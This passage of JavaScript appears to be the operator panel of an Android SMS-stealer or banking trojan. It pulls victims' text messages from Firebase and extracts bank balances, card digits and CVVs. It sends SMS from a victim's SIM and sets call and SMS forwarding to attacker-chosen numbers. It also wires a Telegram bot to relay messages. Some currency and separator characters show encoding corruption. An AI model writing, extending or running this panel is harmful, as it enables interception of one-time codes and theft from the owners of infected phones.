  var smsCount = STATE.detailSms.length;

  document.getElementById('tab-bank-btn').textContent = 'Bank (' + bankCount + ')';
  document.getElementById('tab-cards-btn').textContent = 'Card (' + cardCount + ')';
  document.getElementById('tab-sms-btn').textContent = 'SMS (' + smsCount + ')';

  var bankBadge = document.getElementById('detail-bank-badge');
  bankBadge.style.display = bankCount > 0 ? '' : 'none';
  bankBadge.textContent = bankCount + ' Bank SMS';

  var cardBadge = document.getElementById('detail-card-badge');
  cardBadge.style.display = cardCount > 0 ? '' : 'none';
  cardBadge.textContent = cardCount + ' Card';

  // SMS info in info tab
  if (analysis.phoneNumbers.length > 0 || analysis.networks.length > 0) {
    var smsSection = document.getElementById('info-sms-section');
    smsSection.style.display = '';
    var rows = '';
    analysis.phoneNumbers.forEach(function(p, i) {
      rows += '<div class="info-row"><span class="info-row-label">Phone #' + (i+1) + '</span><span class="info-row-value mono highlight">' + escHtml(p) + '</span></div>';
    });
    analysis.networks.forEach(function(n, i) {
      rows += '<div class="info-row"><span class="info-row-label">Network #' + (i+1) + '</span><span class="info-row-value highlight2">' + escHtml(n) + '</span></div>';
    });
    document.getElementById('info-sms-rows').innerHTML = rows;
  }
}

function renderDetailSms(msgs, analysis, dev) {
  // Bank tab
  document.getElementById('bank-loading').style.display = 'none';
  document.getElementById('bank-sms-count-info').textContent = 'Auto-detected from ' + msgs.length + ' SMS';

  if (analysis.bankBalances.length === 0) {
    document.getElementById('bank-empty').style.display = '';
    document.getElementById('bank-list').style.display = 'none';
  } else {
    document.getElementById('bank-empty').style.display = 'none';
    var bankHtml = '';
    // Summary
    var b0 = analysis.bankBalances[0];
    bankHtml += '<div class="bank-summary-box">';
    bankHtml += '<p class="bank-summary-label">Latest Balance Â· ' + escHtml(b0.bankName) + '</p>';
    bankHtml += '<div class="bank-summary-amount">';
    bankHtml += '<span class="bank-summary-symbol">â‚¹</span>';
    bankHtml += '<span class="bank-summary-val">' + formatAmount(b0.availableBalance) + '</span>';
    if (b0.accountLast4) bankHtml += '<span class="bank-summary-acc">â€¢â€¢' + escHtml(b0.accountLast4) + '</span>';
    bankHtml += '</div></div>';

    analysis.bankBalances.forEach(function(b) {
      var isCredit = b.transactionType === 'credit';
      bankHtml += '<div class="bank-item">';
      bankHtml += '<div class="bank-item-header">';
      bankHtml += '<div class="bank-item-left">';
      bankHtml += '<div class="bank-item-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg></div>';
      bankHtml += '<span class="bank-item-name">' + escHtml(b.bankName) + '</span>';
      bankHtml += '<span class="bank-item-sender">' + escHtml(b.senderName) + '</span>';
      if (b.accountLast4) bankHtml += '<span class="bank-item-acc">â€¢â€¢' + escHtml(b.accountLast4) + '</span>';
      bankHtml += '</div>';
      if (b.transactionType) {
        var txArrow = isCredit
          ? '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M4.5 10.5L12 3m0 0l7.5 7.5M12 3v18"/></svg>'
          : '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 13.5L12 21m0 0l-7.5-7.5M12 21V3"/></svg>';
        bankHtml += '<span class="bank-item-txn ' + (isCredit ? 'credit' : 'debit') + '">' + txArrow + (isCredit ? 'Credit' : 'Debit') + '</span>';
      }
      bankHtml += '</div>';
      bankHtml += '<div class="bank-item-amounts">';
      bankHtml += '<div><p class="bank-item-bal-label">Available Balance</p><p class="bank-item-bal"><span class="bank-item-bal-sym">â‚¹</span>' + formatAmount(b.availableBalance) + '</p></div>';
      if (b.transactionAmount && b.transactionAmount !== b.availableBalance) {
        bankHtml += '<div class="bank-item-txn-amount"><p class="bank-item-txn-label">Transaction</p>';
        bankHtml += '<p class="bank-item-txn-val ' + (isCredit ? 'credit' : 'debit') + '">' + (isCredit ? '+' : '-') + 'â‚¹' + formatAmount(b.transactionAmount) + '</p></div>';
      }
      bankHtml += '</div>';
      bankHtml += '<p class="bank-item-raw">' + escHtml(b.rawSms.substring(0, 130)) + '</p>';
      if (b.detectedAt) bankHtml += '<p class="bank-item-ts">' + escHtml(String(b.detectedAt)) + '</p>';
      bankHtml += '</div>';
    });

    document.getElementById('bank-list').innerHTML = bankHtml;
    document.getElementById('bank-list').style.display = 'block';
    document.getElementById('bank-found-count').textContent = analysis.bankBalances.length + ' bank message(s) found';
  }

  // Cards tab
  var cardsList = document.getElementById('cards-list');
  if (analysis.cards.length === 0) {
    cardsList.innerHTML = '<div class="empty-state" style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;gap:0.5rem;opacity:0.5"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" style="width:2rem;height:2rem"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg><p style="font-size:0.78rem">No card SMS detected</p></div>';
  } else {
    var cardsHtml = '';
    analysis.cards.forEach(function(c) {
      cardsHtml += '<div class="card-item">';
      cardsHtml += '<div class="card-item-top">';
      cardsHtml += '<div class="card-item-left"><div class="card-item-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg></div><span class="card-item-type">' + escHtml(c.cardType || 'Card') + '</span></div>';
      if (c.expiry) cardsHtml += '<span class="card-item-exp">Exp: ' + escHtml(c.expiry) + '</span>';
      cardsHtml += '</div>';
      cardsHtml += '<p class="card-item-number">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; ' + escHtml(c.cardLast4) + '</p>';
      if (c.cvv) {
        cardsHtml += '<div class="card-item-cvv"><span class="card-item-cvv-label">CVV:</span><span class="card-item-cvv-val">' + escHtml(c.cvv) + '</span></div>';
      }
      cardsHtml += '<p class="card-item-raw">' + escHtml(c.rawSms.substring(0, 130)) + '</p>';
      cardsHtml += '</div>';
    });
    cardsList.innerHTML = cardsHtml;
  }

  // SMS tab
  document.getElementById('sms-loading').style.display = 'none';
  if (msgs.length === 0) {
    document.getElementById('sms-empty').style.display = 'flex';
    document.getElementById('sms-list').style.display = 'none';
  } else {
    document.getElementById('sms-empty').style.display = 'none';
    var smsHtml = '';
    msgs.forEach(function(m, i) {
      var text = m.text || '';
      var sender = m.sender || '?';
      var isBankMsg = BANK_SENDERS.test(sender) || BANK_BODY.test(text);
      var isCardMsg = CARD_BODY.test(text);
      var itemClass = isCardMsg ? 'card-sms' : isBankMsg ? 'bank-sms' : 'other-sms';
      smsHtml += '<div class="sms-item ' + itemClass + '">';
      smsHtml += '<div class="sms-item-top">';
      smsHtml += '<div style="display:flex;align-items:center;gap:0.375rem">';
      smsHtml += '<span class="sms-sender ' + itemClass + '">' + escHtml(sender) + '</span>';
      if (isBankMsg) smsHtml += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.75rem;height:0.75rem;color:rgba(34,197,94,0.6)"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
      if (isCardMsg) smsHtml += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.75rem;height:0.75rem;color:rgba(168,85,247,0.6)"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg>';
      smsHtml += '</div>';
      smsHtml += '<span class="sms-time">' + escHtml(String(m.time || '').substring(0, 20)) + '</span>';
      smsHtml += '</div>';
      smsHtml += '<p class="sms-text">' + escHtml(text.substring(0, 250)) + '</p>';
      smsHtml += '</div>';
    });
    var smsList = document.getElementById('sms-list');
    smsList.innerHTML = smsHtml;
    smsList.style.cssText = smsList.style.cssText; // force reflow
    smsList.style.display = 'block';
  }
}

async function refreshDetailSms() {
  if (!STATE.detailDev) return;
  await loadDetailSms(STATE.detailDev);
  showToast('SMS refreshed');
}

function closeDetail() {
  var overlay = document.getElementById('detail-overlay');
  overlay.classList.remove('visible');
  overlay.style.display = 'none';
  STATE.detailDev = null;
}

function switchTab(tab, btnEl) {
  // Deactivate all tabs
  var tabBtns = document.querySelectorAll('.tab-btn');
  tabBtns.forEach(function(b) {
    b.classList.remove('active', 'active-bank', 'active-card-tab', 'active-bot');
  });

  // Activate tab button
  if (btnEl) {
    if (tab === 'bank') btnEl.classList.add('active-bank');
    else if (tab === 'cards') btnEl.classList.add('active-card-tab');
    else if (tab === 'bot') btnEl.classList.add('active-bot');
    else btnEl.classList.add('active');
  }

  // Show pane
  var panes = document.querySelectorAll('.tab-pane');
  panes.forEach(function(p) { p.classList.remove('active'); });
  var active = document.getElementById('tab-' + tab);
  if (active) active.classList.add('active');

  // Load bot UI when bot tab opens
  if (tab === 'bot') loadBotTabUI();
}

// All Telegram calls go via /api/tg (Vercel serverless) to avoid browser CORS block
async function tgGetUpdates(token, offset) {
  try {
    var r = await fetch(
      TG_PROXY + '?method=getUpdates&token=' + encodeURIComponent(token) +
      '&offset=' + encodeURIComponent(offset) +
      '&allowed_updates=' + encodeURIComponent('["message","channel_post"]') +
      '&timeout=2',
      { signal: AbortSignal.timeout(10000) }
    );
    var j = await r.json();
    if (!j.ok) {
      var desc = j.description || 'unknown';
      if (desc.includes('Conflict')) {
        // Another poller using same token — warn once, keep going (bot.py may share token)
        botLog('info', '\u26a0\ufe0f Telegram conflict \u2014 another bot may be polling. Will retry.');
      } else if (desc.includes('Unauthorized')) {
        botLog('err', '\u2717 Token unauthorized \u2014 check your token');
      } else {
        botLog('err', 'getUpdates: ' + desc);
      }
      return [];
    }
    return j.result || [];
  } catch(e) { return []; }
}

async function tgSend(token, chatId, text) {
  try {
    var r = await fetch(TG_PROXY + '?method=sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, chat_id: chatId, text: text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10000),
    });
    return r.ok;
  } catch(e) { return false; }
}

async function tgGetMe(token) {
  try {
    var r = await fetch(
      TG_PROXY + '?method=getMe&token=' + encodeURIComponent(token),
      { signal: AbortSignal.timeout(10000) }
    );
    var j = await r.json();
    if (!j.ok) { botLog('err', 'getMe: ' + (j.description || 'unknown')); return null; }
    return j.result;
  } catch(e) { botLog('err', 'getMe exception: ' + String(e)); return null; }
}

async function deleteDevice() {
  if (!STATE.detailDev) return;
  var dev = STATE.detailDev;
  if (!confirm('Delete "' + dev.name + '" permanently?')) return;

  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '.json?auth=' + encodeURIComponent(STATE.fbKey), { method: 'DELETE' });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    closeDetail();
    showToast('Device deleted');
    STATE.devices = STATE.devices.filter(function(d) { return d.id !== dev.id; });
    renderDashboard();
  } catch(e) {
    var msg = e.message || String(e);
    showToast(msg.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Delete failed');
  }
}

// ————————————————————————————————————————————————————————————————————————————————
// Send SMS
// ————————————————————————————————————————————————————————————————————————————————
function selectSim(n) {
  STATE.selectedSim = n;
  document.getElementById('sim-btn-1').className = 'sim-btn' + (n === 1 ? ' active' : '');
  document.getElementById('sim-btn-2').className = 'sim-btn' + (n === 2 ? ' active' : '');
  document.getElementById('btn-send-text').textContent = 'Send via SIM ' + n;
}

function useDeviceNumber() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var phone = dev.phoneNumber && dev.phoneNumber !== '—' ? dev.phoneNumber : '';
  if (phone) document.getElementById('send-to').value = phone;
}

// Firebase: fetch SMS for auto-forward
// bot.py monitor_worker ONLY reads clients/{dev}/inbox (line 745)
// We mirror this exactly — single path, raw Firebase key as dedup ID
async function botFetchSms(deviceId) {
  var base = STATE.fbUrl.replace(/\/$/, '');
  var auth = '?auth=' + encodeURIComponent(STATE.fbKey);
  var results = {};

  // Primary: clients/{deviceId}/inbox — exact bot.py path (line 745)
  // bot.py uses raw mid (Firebase push key) as seen-set key
  try {
    var r1 = await fetch(base + '/clients/' + deviceId + '/inbox.json' + auth, { signal: AbortSignal.timeout(8000) });
    if (r1.ok) {
      var j1 = await r1.json();
      if (j1 && typeof j1 === 'object') {
        Object.entries(j1).forEach(function(kv) {
          var d = kv[1] || {};
          var body = d.message || d.body || d.content || '';
          if (!body) return;
          results[kv[0]] = {   // raw Firebase key — matches bot.py mid
            key: kv[0],
            sender: d.from || d.sender || d.address || '?',
            body: body,
          };
        });
      }
    }
  } catch(e) {}

  return Object.values(results);
}

// Firebase send SMS — mirrors bot.py send_via_fb() exactly
// IMPORTANT: APK uses 0-indexed SIM slots (sim1=0, sim2=1) — NOT 1-indexed
async function botSendSms(deviceId, sim, to, msg) {
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var simSlot = sim - 1;  // convert UI 1/2 → APK 0/1
    var r = await fetch(base + '/clients/' + deviceId + '/webhookEvent/sendSms.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: simSlot, to: to.trim(), message: msg.trim(), isSended: false, timestamp: Math.floor(Date.now()/1000) }),
      signal: AbortSignal.timeout(8000),
    });
    return r.ok;
  } catch(e) { return false; }
}

async function sendSms() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var to = document.getElementById('send-to').value.trim();
  var msg = document.getElementById('send-msg').value.trim();

  if (!to || !msg) { showToast('Fill number and message'); return; }

  var btn = document.getElementById('btn-send-sms');
  var btnText = document.getElementById('btn-send-text');
  btn.disabled = true;
  btnText.textContent = 'Sending…';

  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var simSlot = (STATE.selectedSim || 1) - 1;  // UI 1/2 → APK 0/1
    var resp = await fetch(base + '/clients/' + dev.id + '/webhookEvent/sendSms.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: simSlot, to: to, message: msg, isSended: false, timestamp: Math.floor(Date.now()/1000) }),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS queued!');
    document.getElementById('send-msg').value = '';
    document.getElementById('send-char-count').textContent = '0 chars';
  } catch(e) {
    var err = e.message || String(e);
    showToast(err.includes('PERMISSION_DENIED') ? 'Firebase permission denied — cannot send' : 'Send failed: ' + err);
  } finally {
    btn.disabled = false;
    selectSim(STATE.selectedSim);
  }
}

async function sendCallForward() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var fwdNum = document.getElementById('call-forward-number').value.trim();
  if (!fwdNum) { showToast('Enter a forwarding number'); return; }
  var btn = document.getElementById('btn-call-forward');
  btn.disabled = true; btn.textContent = 'Setting…';
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    // Try both command paths: Commands node (PUT) and commandList (POST)
    var payload = {
      type: 'callForward',
      callForwardNumber: fwdNum,
      forwardTo: fwdNum,
      enable: true,
      isSended: false,
      time: Date.now()
    };
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 Call forward set to ' + fwdNum);
    document.getElementById('call-forward-number').value = '';
  } catch(e) { showToast('Failed: ' + (e.message || e)); }
  finally { btn.disabled = false; btn.textContent = 'Set Forward'; }
}

async function disableCallForward() {
  var dev = STATE.detailDev; if (!dev) return;
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'callForward', callForwardNumber: '', forwardTo: '', enable: false, isSended: false, time: Date.now() }),
    });
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 Call forwarding disabled');
  } catch(e) { showToast('Failed to disable call forward'); }
}

async function sendSmsForward() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var fwdNum = document.getElementById('sms-forward-number').value.trim();
  if (!fwdNum) { showToast('Enter a forwarding number'); return; }
  var btn = document.getElementById('btn-sms-forward');
  btn.disabled = true; btn.textContent = 'Setting…';
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var payload = {
      type: 'smsForward',
      smsForwardNumber: fwdNum,
      forwardTo: fwdNum,
      enable: true,
      isSended: false,
      time: Date.now()
    };
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS forwarding set to ' + fwdNum);
    document.getElementById('sms-forward-number').value = '';
  } catch(e) { showToast('Failed: ' + (e.message || e)); }
  finally { btn.disabled = false; btn.textContent = 'Set Forward'; }
}

async function disableSmsForward() {
  var dev = STATE.detailDev; if (!dev) return;
  try {
    var base = STATE.fbUrl.replace(/\/$/, '');
    var resp = await fetch(base + '/clients/' + dev.id + '/Commands.json?auth=' + encodeURIComponent(STATE.fbKey), {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'disableSmsForward', isSended: false }),
    });
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    showToast('\u2713 SMS forwarding disabled');
  } catch(e) { showToast('Failed to disable SMS forward'); }
}

// ————————————————————————————————————————————————————————————————————————————————
// Init
// ————————————————————————————————————————————————————————————————————————————————
document.addEventListener('DOMContentLoaded', function() {
  // Wire up buttons
  document.getElementById('btn-show-new').addEventListener('click', showNewAccountForm);
  document.getElementById('btn-back-saved').addEventListener('click', showSavedAccounts);
  document.getElementById('btn-cancel-form').addEventListener('click', showSavedAccounts);

  // Enter key to connect
  document.getElementById('input-url').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') handleConnect();
  });
  document.getElementById('input-key').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') handleConnect();
  });

  // Check for ?s= share param
  var shareData = parseShareParam();
  if (shareData) {
    // Auto-connect
    startDashboard(shareData.url, shareData.key);
    return;
  }

  // Render saved accounts
  renderSavedAccounts();
});

// ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
// TELEGRAM BOT ENGINE  v2 — fully aligned with bot.py logic
// ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

var _botTimers  = {};  // { deviceId: intervalId }
var _botRunning = {};  // { deviceId: bool } — tick-lock to prevent overlapping async ticks
var _botSim    = 1;
var _botRepeat = 1;
var BOT_LS_KEY = 'money_panel_bot_cfg_v3';
var TG_PROXY   = '/api/tg';   // Vercel serverless proxy — avoids browser CORS block to api.telegram.org

// ————————————————————————————————————————————————————————————————————————————————
function loadBotCfg() {
  try { return JSON.parse(localStorage.getItem(BOT_LS_KEY) || '{}'); }
  catch(e) { return {}; }
}
function getBotCfg(deviceId) {
  return loadBotCfg()[deviceId] || {
    token: '',
    chatId: '', sim: 1, repeat: 1,
    format: 'auto',
    enabled: false,
    offset: 0, seenSmsKeys: [], sentCount: 0
  };
}
function setBotCfg(deviceId, patch) {
  var all = loadBotCfg();
  all[deviceId] = Object.assign(getBotCfg(deviceId), patch);
  localStorage.setItem(BOT_LS_KEY, JSON.stringify(all));
  return all[deviceId];
}

// ── Format preview map (shown below the format dropdown) ────────────────────
var BOT_FORMAT_PREVIEWS = {
  'auto': 'Tries all formats automatically. Any of the examples below will work.',
  'plain': 'Send in your chat:\n\nTo: +91XXXXXXXXXX\nMessage: your text here',
  'phone_inline': 'Send in your chat:\n\n📞 To: +91XXXXXXXXXX\n💬 Message: your text here',
  'phone_nextline': 'Send in your chat:\n\n📱 To:\n+91XXXXXXXXXX\n💬 Full Message:\nyour text here',
  'dot_nextline': 'Send in your chat:\n\n📍 To:\n+91XXXXXXXXXX\n💬 Message:\nyour text here',
  'receiver_nextline': 'Send in your chat:\n\n📱 Receiver\n+91XXXXXXXXXX\n🔑 Message\nyour text here',
  'tag': 'Send in your chat:\n\n🏷️ RECIPIENT: +91XXXXXXXXXX\n🏷️ MESSAGE: your text here',
};

function updateFormatPreview() {
  var sel = document.getElementById('bot-format');
  var preview = document.getElementById('bot-format-preview-text');
  if (!sel || !preview) return;
  var text = BOT_FORMAT_PREVIEWS[sel.value] || '';
  preview.innerHTML = text.replace(/\n/g, '<br>').replace(/(To:|Message:|RECIPIENT:|MESSAGE:|Receiver|Full Message:)/g, '<code>$1</code>');
}
// SMS PARSER — exact port of bot.py parse_sms() lines 619-643
// bot.py line 627: if line.startswith(tp) and tk in line
// CRITICAL: emojis stored as UTF-8 code points, not mojibake
function parseTgSmsRequest(text, format) {
  if (!text) return null;
  format = format || 'auto';
  var lines = text.split('\n').map(function(l){ return l.trim(); }).filter(Boolean);

  // Format 6 - tag format (bot.py lines 621-623)
  // startsWith("\uD83C\uDFF7\uFE0F MESSAGE") or "\uD83C\uDFF7 MESSAGE"
  var rl = null, ml2 = null;
  for (var x = 0; x < lines.length; x++) {
    var lx = lines[x].replace(/\uFE0F/g, ''); // strip variation selector
    if (!rl  && (lx.includes('RECIPIENT:') || lx.startsWith('\uD83C\uDFF7 RECIPIENT'))) rl  = lines[x];
    if (!ml2 && (lx.includes('MESSAGE:')   || lx.startsWith('\uD83C\uDFF7 MESSAGE')))   ml2 = lines[x];
  }
  if (rl && ml2) {
    var rval = rl.split(':').slice(1).join(':').trim();
    var mval = ml2.split(':').slice(1).join(':').trim();
    if (rval && mval) return { to: rval, msg: mval };
  }

  // Generic finder — mirrors bot.py _f(tp, tk, mp, mk, ti, mi)
  // tp = phone-line prefix (emoji or keyword)
  // tk = phone key label (e.g. "To:")
  // mp = message-line prefix
  // mk = message key label (e.g. "Message:")
  // ti = phone value is INLINE (same line after tk)
  // mi = message value is INLINE (same line after mk)
  function _f(tp, tk, mp, mk, ti, mi) {
    var t = null, m = null;
    for (var i = 0; i < lines.length; i++) {
      var line = lines[i];
      // phone line: starts with tp AND contains tk
      if (t === null && line.includes(tp) && line.includes(tk)) {
        var v = line.split(tk).slice(1).join(tk).trim();
        t = (ti && v) ? v : ((i + 1 < lines.length) ? lines[i + 1] : null);
      }
      // message line: starts with mp AND contains mk
      if (m === null && line.includes(mp) && line.includes(mk)) {
        var v2 = line.split(mk).slice(1).join(mk).trim();
        m = (mi && v2) ? v2 : ((i + 1 < lines.length) ? lines[i + 1] : null);
      }
    }
    return (t && m) ? { to: t, msg: m } : null;
  }

  // Combos — exact copy of bot.py lines 634-639
  // Using Unicode escapes to avoid file encoding corruption
  var combos = [
    // A: "\uD83D\uDCF1 To: ...\n\uD83D\uDCAC Full Message:\nnextline"
    ['\uD83D\uDCF1', 'To:',       '\uD83D\uDCAC', 'Full Message:',  true,  false],
    // B: "\uD83D\uDCCD To:\nnextline\n\uD83D\uDCAC Message:\nnextline"
    ['\uD83D\uDCCD', 'To:',       '\uD83D\uDCAC', 'Message:',       false, false],
    // C: "To: number\nMessage: text" (plain, both inline)
    ['To:',          'To:',        'Message:',      'Message:',       true,  true ],
    // D: "\uD83D\uDCF1 Receiver\nnextline\uD83D\uDD11 Message\nnextline"
    ['\uD83D\uDCF1', 'Receiver',   '\uD83D\uDD11', 'Message',        false, false],
    // E: "\uD83D\uDCDE To: number \uD83D\uDCAC Message: text" (both inline)
    ['\uD83D\uDCDE', 'To:',        '\uD83D\uDCAC', 'Message:',       true,  true ],
  ];

  // Try selected format first, then fall back to all (auto-detect)
  var fmtIdx = { phone_nextline: 0, dot_nextline: 1, plain: 2, receiver_nextline: 3, phone_inline: 4 };
  var tryOrder = [];
  if (format !== 'auto' && fmtIdx[format] !== undefined) {
    tryOrder.push(fmtIdx[format]); // preferred format first
  }
  for (var c = 0; c < combos.length; c++) {
    if (tryOrder.indexOf(c) === -1) tryOrder.push(c);
  }

  for (var ci = 0; ci < tryOrder.length; ci++) {
    var co = combos[tryOrder[ci]];
    var res = _f(co[0], co[1], co[2], co[3], co[4], co[5]);
    if (res) {
      botLog('info', '\u2714 Format ' + tryOrder[ci] + ' matched \u2014 To=' + res.to.slice(0,15));
      return res;
    }
  }
  return null;
}

// â”€â”€ Firebase: fetch SMS for auto-forward â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// bot.py monitor_worker reads clients/{dev}/inbox (line 745)
// Panel SMS tab reads messages/{dev} (profex path)
// We check BOTH to catch all new SMS

// â”€â”€ Bot Activity Log â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function botLog(type, text) {
  var log = document.getElementById('bot-log');
  if (!log) return;
  var empty = log.querySelector('.bot-log-empty');
  if (empty) empty.remove();
  var now = new Date();
  var ts = ('0'+now.getHours()).slice(-2) + ':' + ('0'+now.getMinutes()).slice(-2) + ':' + ('0'+now.getSeconds()).slice(-2);
  var cls = { ok: 'log-ok', err: 'log-err', info: 'log-info', fwd: 'log-fwd' }[type] || '';
  var el = document.createElement('div');
  el.className = 'bot-log-entry';
  el.innerHTML = '<span class="log-time">' + ts + '</span> <span class="' + cls + '">' + text + '</span>';
  log.insertBefore(el, log.firstChild);
  while (log.children.length > 80) log.removeChild(log.lastChild);
}
function clearBotLog() {
  var log = document.getElementById('bot-log');
  if (log) log.innerHTML = '<p class="bot-log-empty">No activity yetâ€¦</p>';
}

// â”€â”€ Bot UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function updateBotStatusUI(running, sentCount) {
  var dot = document.getElementById('bot-status-dot');
  var txt = document.getElementById('bot-status-text');
  var cnt = document.getElementById('bot-sent-count');
  var btn = document.getElementById('bot-btn-start');
  if (!dot) return;
  if (running) {
